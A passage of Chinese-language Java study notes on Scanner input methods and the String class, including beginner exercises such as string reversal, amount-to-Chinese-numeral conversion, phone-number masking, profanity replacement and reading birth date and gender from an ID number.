<li>可以接受任意数据，但是都会返回⼀个字符串</li>
</ul>
<h4 id="nextInt"><a class="header-anchor" href="#nextInt">¶</a>nextInt()</h4>
<ul>
<li>只能接受整数</li>
</ul>
<h4 id="nextDouble"><a class="header-anchor" href="#nextDouble">¶</a>nextDouble()</h4>
<ul>
<li>能接收整数和⼩数，但是都会看做⼩数返回。录⼊字⺟会报错</li>
</ul>
<h3 id="方法底层细节"><a class="header-anchor" href="#方法底层细节">¶</a>方法底层细节</h3>
<h4 id="第⼀个细节"><a class="header-anchor" href="#第⼀个细节">¶</a>第⼀个细节</h4>
<ul>
<li>next（），nextInt（），nextDouble（）在接收数据的时候，会遇到空格，回⻋，制表符其中⼀个就会停⽌接收数据</li>
</ul>
<h4 id="第二个细节"><a class="header-anchor" href="#第二个细节">¶</a>第二个细节</h4>
<ul>
<li>next（），nextInt（），nextDouble（）在接收数据的时候，会遇到空格，回⻋，制表符其中⼀个就会停⽌接收数据。但是这些符号 + 后⾯的数据还在内存中并没有接收。</li>
<li>如果后⾯还有其他键盘录⼊的⽅法，会⾃动将这些数据接收</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> sc.next();</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> sc.next();</span><br><span class="line">System.out.println(s1);  <span class="comment">// a</span></span><br><span class="line">System.out.println(s2);  <span class="comment">// b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//此时值键盘录入一次a b(注意a和b之间用空格隔开)</span></span><br><span class="line"><span class="comment">//那么第一个next();会接收a，a后面是空格，那么就停止，所以打印s1是a</span></span><br><span class="line"><span class="comment">//但是空格+b还在内存中。</span></span><br><span class="line"><span class="comment">//第二个next会去掉前面的空格，只接收b</span></span><br><span class="line"><span class="comment">//所以第二个s2打印出来是b</span></span><br></pre></td></tr></table></figure>
<h4 id="第三个细节"><a class="header-anchor" href="#第三个细节">¶</a>第三个细节</h4>
<ul>
<li>nextLine（）⽅法是把⼀整⾏全部接收完毕</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> sc.nextLine();</span><br><span class="line">System.out.println(s);  <span class="comment">// a b</span></span><br><span class="line"><span class="comment">//键盘录入a b(注意a和b之间用空格隔开)</span></span><br><span class="line"><span class="comment">//那么nextLine不会过滤前面和后面的空格，会把这一整行数据全部接收完毕。</span></span><br></pre></td></tr></table></figure>
<h3 id="混用引起的后果"><a class="header-anchor" href="#混用引起的后果">¶</a>混用引起的后果</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);<span class="comment">//①</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> sc.nextInt();<span class="comment">//②</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> sc.nextLine();<span class="comment">//③</span></span><br><span class="line">System.out.println(i);<span class="comment">//④</span></span><br><span class="line">System.out.println(s);<span class="comment">//⑤</span></span><br></pre></td></tr></table></figure>
<ul>
<li>当代码运⾏到第⼆⾏，会让我们键盘录⼊，此时录⼊123。但是实际上我们录的是123+回⻋</li>
<li>⽽nextInt是遇到空格，回⻋，制表符都会停⽌</li>
<li>所以nextInt只能接受123</li>
<li>回⻋还在内存中没有被接收。此时就被nextLine接收了</li>
<li>所以，如果混⽤就会导致nextLine接收不到数据</li>
<li>有时候就需要加一行nextLine()来吞回车</li>
</ul>
<h3 id="使用结论"><a class="header-anchor" href="#使用结论">¶</a>使用结论</h3>
<ul>
<li>
<p>键盘录⼊分为两套：</p>
<ul>
<li>next（）、nextInt（）、nextDouble（）这三个配套使⽤。</li>
<li>如果⽤了这三个其中⼀个，就不要⽤nextLine（）。</li>
</ul>
</li>
<li>
<p>nextLine（）单独使⽤。</p>
<ul>
<li>如果想要整数，那么先接收，再使⽤Integer.parseInt进⾏类型转换</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> sc.next();<span class="comment">//键盘录入123</span></span><br><span class="line">System.out.println(<span class="string">&quot;此时为字符串&quot;</span> + s);<span class="comment">//此时123是字符串</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> sc.nextInt();<span class="comment">//键盘录入123</span></span><br><span class="line">System.out.println(<span class="string">&quot;此时为整数：&quot;</span> + i);</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> sc.nextLine();<span class="comment">//键盘录入123</span></span><br><span class="line">System.out.println(<span class="string">&quot;此时为字符串&quot;</span> + s);<span class="comment">//此时123是字符串</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> Integer.parseInt(s);<span class="comment">//想要整数再进行转换</span></span><br><span class="line">System.out.println(<span class="string">&quot;此时为整数：&quot;</span> + i);</span><br></pre></td></tr></table></figure>
<h2 id="Day10-字符串"><a class="header-anchor" href="#Day10-字符串">¶</a>Day10 字符串</h2>
<h3 id="API"><a class="header-anchor" href="#API">¶</a>API</h3>
<h4 id="概念-v4"><a class="header-anchor" href="#概念-v4">¶</a>概念</h4>
<ul>
<li>API (Application Programming Interface) ：应⽤程序编程接⼝</li>
</ul>
<h4 id="Java中的API"><a class="header-anchor" href="#Java中的API">¶</a>Java中的API</h4>
<ul>
<li>
<p>指的就是 JDK 中提供的各种功能的<strong>Java类</strong>，这些类将底层的实现封装了起来</p>
</li>
<li>
<p>不需要关⼼这些类是如何实现的，只需要学习这些类<strong>如何使⽤</strong>即可，我们可以通过帮助⽂档来学习这些API如何使⽤</p>
</li>
<li>
<p>在API帮助文档中查找包、类、类在哪个包下、类的构造方法、类的成员方法</p>
</li>
</ul>
<h3 id="String类"><a class="header-anchor" href="#String类">¶</a>String类</h3>
<h4 id="概述"><a class="header-anchor" href="#概述">¶</a>概述</h4>
<ul>
<li>String 类代表字符串，Java 程序中的所有字符串⽂字（例如“abc”）都被实现为此类的实例</li>
<li>也就是说，Java 程序中所有的双引号字符串，都是 String 类的对象</li>
<li>String 类在 java.lang 包下，所以使⽤的时候不需要导包</li>
</ul>
<h4 id="特点"><a class="header-anchor" href="#特点">¶</a>特点</h4>
<ul>
<li><strong>字符串不可变</strong>，它们的值在创建后不能被更改</li>
<li>虽然 String 的值是不可变的，但是它们<strong>可以被共享</strong></li>
<li>字符串效果上相当于字符数组( char[] )，但是<strong>底层原理是字节数组( byte[] )</strong></li>
</ul>
<h4 id="构造方法-v2"><a class="header-anchor" href="#构造方法-v2">¶</a>构造方法</h4>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>public String()</td>
<td>创建一个空白字符串对象，不含有任何内容</td>
</tr>
<tr>
<td>public String(char[] chs)</td>
<td>根据字符数组的内容，来创建字符串对象</td>
</tr>
<tr>
<td>public String(byte[] bys)</td>
<td>根据字节数组的内容，来创建字符串对象</td>
</tr>
<tr>
<td>String s = “abc”;</td>
<td>直接赋值的方式创建字符串，内容就是abc</td>
</tr>
</tbody>
</table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//public String()：创建⼀个空⽩字符串对象，不含有任何内容</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//public String(char[] chs)：根据字符数组的内容，来创建字符串对象</span></span><br><span class="line">charchs = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(chs);</span><br><span class="line"></span><br><span class="line"><span class="comment">//public String(byte[] bys)：根据字节数组的内容，来创建字符串对象</span></span><br><span class="line">bytebys = &#123;<span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>&#125;;</span><br><span class="line"><span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bys);</span><br><span class="line"></span><br><span class="line"><span class="comment">//String s = “abc”; 直接赋值的⽅式创建字符串对象，内容就是abc</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s4</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br></pre></td></tr></table></figure>
<h4 id="创建字符串对象两种方式的区别"><a class="header-anchor" href="#创建字符串对象两种方式的区别">¶</a>创建字符串对象两种方式的区别</h4>
<ul>
<li>通过构造方法创建
<ul>
<li>通过 new 创建的字符串对象，每⼀次 new 都会申请⼀个内存空间，虽然<strong>内容相同</strong>，但是<strong>地址值不同</strong></li>
</ul>
</li>
<li>直接赋值方式创建
<ul>
<li>以“”⽅式给出的字符串，只要<strong>字符序列相同</strong>(顺序和⼤⼩写)，⽆论在程序代码中出现⼏次，JVM 都<strong>只会建⽴⼀个 String 对象</strong>，并<strong>在字符串池中维护</strong></li>
</ul>
</li>
</ul>
<h4 id="字符串的比较"><a class="header-anchor" href="#字符串的比较">¶</a>字符串的比较</h4>
<h5 id="号的作用"><a class="header-anchor" href="#号的作用">¶</a>==号的作用</h5>
<ul>
<li>⽐较基本数据类型：⽐较的是<strong>具体的值</strong></li>
<li>⽐较引⽤数据类型：⽐较的是<strong>对象地址值</strong></li>
</ul>
<h5 id="euqals方法的使用"><a class="header-anchor" href="#euqals方法的使用">¶</a>euqals方法的使用</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造⽅法的⽅式得到对象</span></span><br><span class="line">charchs = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(chs);</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(chs);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接赋值的⽅式得到对象</span></span><br><span class="line"><span class="comment">// 其实地址是一样的吧</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s4</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ⽐较字符串对象地址是否相同</span></span><br><span class="line">System.out.println(s1 == s2);</span><br><span class="line">System.out.println(s1 == s3);</span><br><span class="line">System.out.println(s3 == s4);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ⽐较字符串内容是否相同</span></span><br><span class="line">System.out.println(s1.equals(s2));</span><br><span class="line">System.out.println(s1.equals(s3));</span><br><span class="line">System.out.println(s3.equals(s4));</span><br></pre></td></tr></table></figure>
<ul>
<li>应用：用户登录案例
<ul>
<li><code>if (username.equals(rightUsername) &amp;&amp; password.equals(rightPassword))</code></li>
</ul>
</li>
</ul>
<h4 id="案例：遍历字符串案例"><a class="header-anchor" href="#案例：遍历字符串案例">¶</a>案例：遍历字符串案例</h4>
<ul>
<li>键盘录入一个字符串，使用程序实现在控制台遍历该字符串</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 有两个方法：</span></span><br><span class="line"><span class="comment">// charAt()：会根据索引获取对应的字符</span></span><br><span class="line"><span class="comment">// length(): 会返回字符串的⻓度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">	<span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> str.charAt(i);</span><br><span class="line">    System.out.println(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="案例：反转字符串"><a class="header-anchor" href="#案例：反转字符串">¶</a>案例：反转字符串</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> reverse(str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">reverse</span><span class="params">(String str)</span>&#123;<span class="comment">//abc</span></span><br><span class="line"><span class="comment">// 核⼼思想：倒着遍历并进⾏拼接就可以了</span></span><br><span class="line"><span class="comment">// fori :正着遍历 forr：倒着遍历</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> str.length() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) </span><br><span class="line">    <span class="comment">// i 依次表⽰字符串⾥⾯的每⼀个索引（倒着的）</span></span><br><span class="line">    <span class="comment">// 我们就可以拿到⾥⾯的每⼀个字符并拼接</span></span><br><span class="line">    s = s + str.charAt(i);</span><br><span class="line"><span class="keyword">return</span> s;</span><br></pre></td></tr></table></figure>
<h4 id="案例：金额转换"><a class="header-anchor" href="#案例：金额转换">¶</a>案例：金额转换</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringDemo9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.键盘录入一个金额</span></span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">    <span class="type">int</span> money;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;请录入一个金额&quot;</span>);</span><br><span class="line">        money = sc.nextInt();</span><br><span class="line">        <span class="keyword">if</span> (money &gt;= <span class="number">0</span> &amp;&amp; money &lt;= <span class="number">9999999</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;金额无效&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 定义一个变量用来表示钱的大写</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">moneyStr</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2.得到money里面的每一位数字，再转换成中文</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123; <span class="comment">// 2135</span></span><br><span class="line">        <span class="comment">// 从右往左获取数据，因为右侧是数据的个位</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">ge</span> <span class="operator">=</span> money % <span class="number">10</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">capitalNumber</span> <span class="operator">=</span> getCapitalNumber(ge);</span><br><span class="line">        <span class="comment">// 把转换之后的大写拼接到moneyStr当中</span></span><br><span class="line">        moneyStr = capitalNumber + moneyStr;</span><br><span class="line">        <span class="comment">// 第一次循环：“伍” + &quot;&quot; = “伍”</span></span><br><span class="line">        <span class="comment">// 第二次循环：“叁” + “伍” = “叁伍”</span></span><br><span class="line">        <span class="comment">// 去掉刚才获取的数据</span></span><br><span class="line">        money = money / <span class="number">10</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果数字上的每一位全部获取到了，那么money记录为0，循环停止</span></span><br><span class="line">        <span class="keyword">if</span> (money == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在前面补0.补齐7位</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">7</span> - moneyStr.length();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; count; i ++) &#123;</span><br><span class="line">        moneyStr = <span class="string">&quot;零&quot;</span> + moneyStr;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(moneyStr);  <span class="comment">// 零零零叁壹叁伍</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 插入单位</span></span><br><span class="line">    <span class="comment">// 定义一个数组表示单位</span></span><br><span class="line">    String[] arr = &#123;<span class="string">&quot;佰&quot;</span>, <span class="string">&quot;拾&quot;</span>, <span class="string">&quot;万&quot;</span>, <span class="string">&quot;仟&quot;</span>, <span class="string">&quot;佰&quot;</span>, <span class="string">&quot;拾&quot;</span>, <span class="string">&quot;元&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// 				零	零	零 	叁		壹	叁	伍</span></span><br><span class="line">    <span class="comment">// 遍历moneyStr， 依次得到零	零	零 	叁		壹	叁	伍</span></span><br><span class="line">    <span class="comment">// 然后把arr的单位插入进去</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; moneyStr.length(); i ++) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> moneyStr.charAt(i);</span><br><span class="line">        <span class="comment">// 把大写数字和单位拼接到result中</span></span><br><span class="line">        result = result + c + arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 打印最终结果 </span></span><br><span class="line">    System.out.println(result);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 定义一个方法把数字变成大写的中文</span></span><br><span class="line">    <span class="comment">// 1 -- 壹</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getCapitalNumber</span><span class="params">(<span class="type">int</span> number)</span> &#123;</span><br><span class="line">        <span class="comment">// 定义数组，让数字跟大写的中文产生一个对应关系</span></span><br><span class="line">        String[] arr = &#123;<span class="string">&quot;零&quot;</span>, <span class="string">&quot;一&quot;</span>, <span class="string">&quot;二&quot;</span>, <span class="string">&quot;三&quot;</span>, <span class="string">&quot;肆&quot;</span>, <span class="string">&quot;伍&quot;</span>, <span class="string">&quot;陆&quot;</span>, <span class="string">&quot;柒&quot;</span>, <span class="string">&quot;捌&quot;</span>, <span class="string">&quot;玖&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">// 返回结果</span></span><br><span class="line">        <span class="keyword">return</span> arr[number];</span><br><span class="line">    &#125;        	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="案例：手机号屏蔽"><a class="header-anchor" href="#案例：手机号屏蔽">¶</a>案例：手机号屏蔽</h4>
<ul>
<li>
<p>需求：以字符串的形式从键盘接受一个手机号，将中间四位号码屏蔽</p>
</li>
<li>
<p>最终效果：111****1111</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test8</span>手机号屏蔽 &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*以字符串的形式从键盘接受一个手机号，将中间四位号码屏蔽</span></span><br><span class="line"><span class="comment">        最终效果为：131****9468*/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.键盘录入一个手机号码</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入手机号码&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">phoneNumber</span> <span class="operator">=</span> sc.next();<span class="comment">//13112349408</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.截取手机号码中的前三位</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">star</span> <span class="operator">=</span> phoneNumber.substring(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.截取手机号码中的最后四位</span></span><br><span class="line">        <span class="comment">//此时我用substring方法，是用1个参数的，还是两个参数的？1个参数的会更好</span></span><br><span class="line">        <span class="comment">//因为现在我要截取到最后，所以建议使用1个参数的。</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">end</span> <span class="operator">=</span> phoneNumber.substring(<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.拼接</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> star + <span class="string">&quot;****&quot;</span> + end;</span><br><span class="line"></span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="案例：敏感词替换"><a class="header-anchor" href="#案例：敏感词替换">¶</a>案例：敏感词替换</h4>
<ul>
<li>需求：键盘录入一个字符串，如果字符串中包含（TMD），则使用***替换</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test9</span>敏感词替换 &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.定义一个变量表示骂人的话</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">talk</span> <span class="operator">=</span> <span class="string">&quot;后裔你玩什么啊，TMD&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.把这句话中的敏感词进行替换</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> talk.replace(<span class="string">&quot;TMD&quot;</span>, <span class="string">&quot;***&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.打印</span></span><br><span class="line">        System.out.println(talk);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>扩展：需要替换的敏感词比较多怎么办</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test10</span>多个敏感词替换 &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//实际开发中，敏感词会有很多很多</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.先键盘录入要说的话</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入要说的话&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">talk</span> <span class="operator">=</span> sc.next();<span class="comment">//后裔你玩什么啊，TMD,GDX,ctmd,ZZ</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.定义一个数组用来存多个敏感词</span></span><br><span class="line">        String[] arr = &#123;<span class="string">&quot;TMD&quot;</span>,<span class="string">&quot;GDX&quot;</span>,<span class="string">&quot;ctmd&quot;</span>,<span class="string">&quot;ZZ&quot;</span>,<span class="string">&quot;lj&quot;</span>,<span class="string">&quot;FW&quot;</span>,<span class="string">&quot;nt&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.把说的话中所有的敏感词都替换为***</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="comment">//i 索引</span></span><br><span class="line">            <span class="comment">//arr[i] 元素 --- 敏感词</span></span><br><span class="line">            talk = talk.replace(arr[i],<span class="string">&quot;***&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.打印结果</span></span><br><span class="line">        System.out.println(talk);<span class="comment">//后裔你玩什么啊，,,,</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>也就是从单一屏蔽词匹配变成匹配词列表，对于输入语句进行遍历查找替换</li>
</ul>
<h4 id="案例：身份证信息查看"><a class="header-anchor" href="#案例：身份证信息查看">¶</a>案例：身份证信息查看</h4>
<ul>
<li>
<p>身份证的每一位都是有固定的含义：</p>
<ul>
<li>1、2位：省份</li>
<li>3、4位：城市</li>
<li>5、6位：区县</li>
<li>7-14位：出生年、月、日</li>
<li>15、16位：所在地派出所</li>
<li>17位：性别（奇数男性，偶数女性）</li>
<li>18位：个人信息码（随机产生）</li>
</ul>
</li>
<li>
<p>要求打印内容方式如下：</p>
<ul>
<li>人物信息为：</li>
<li>出生年月日：XXXX年X月X日</li>
<li>性别为：男/女</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.stringdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StringDemo11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.定义一个字符串记录身份证号码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> <span class="string">&quot;321281202001011234&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.获取出生年月日</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">year</span> <span class="operator">=</span> id.substring(<span class="number">6</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">month</span> <span class="operator">=</span> id.substring(<span class="number">10</span>, <span class="number">12</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">day</span> <span class="operator">=</span> id.substring(<span class="number">12</span>, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;人物信息为：&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;出生年月日:&quot;</span> + year + <span class="string">&quot;年&quot;</span> + month + <span class="string">&quot;月&quot;</span> + day + <span class="string">&quot;日&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.获取性别</span></span><br><span class="line">        <span class="type">char</span> <span class="variable">gender</span> <span class="operator">=</span> id.charAt(<span class="number">16</span>);<span class="comment">//&#x27;3&#x27;  ---&gt; 3</span></span><br><span class="line">        <span class="comment">//利用ASCII码表进行转换</span></span><br><span class="line">        <span class="comment">//&#x27;0&#x27; ---&gt;  48</span></span><br><span class="line">        <span class="comment">//&#x27;1&#x27; ---&gt;  49</span></span><br><span class="line">        <span class="comment">//&#x27;2&#x27; ---&gt;  50</span></span><br><span class="line">        <span class="comment">//&#x27;3&#x27; ---&gt;  51</span></span><br><span class="line">        <span class="comment">//&#x27;4&#x27; ---&gt;  52</span></span><br><span class="line">        <span class="comment">//&#x27;5&#x27; ---&gt;  53</span></span><br><span class="line">        <span class="comment">//&#x27;6&#x27; ---&gt;  54</span></span><br><span class="line">        <span class="comment">//&#x27;7&#x27; ---&gt;  55</span></span><br><span class="line">        <span class="comment">//&#x27;8&#x27; ---&gt;  56</span></span><br><span class="line">        <span class="comment">//&#x27;9&#x27; ---&gt;  57</span></span><br><span class="line"></span><br><span class="line">       <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> gender - <span class="number">48</span>;</span><br><span class="line">        <span class="keyword">if</span>(num % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;性别为:女&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;性别为:男&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="StringBuilder"><a class="header-anchor" href="#StringBuilder">¶</a>StringBuilder</h3>
<ul>
<li>可以看成是一个容器，创建之后里面的内容是可变的</li>
<li>在拼接字符串和反转字符串的时候会使用到</li>
</ul>
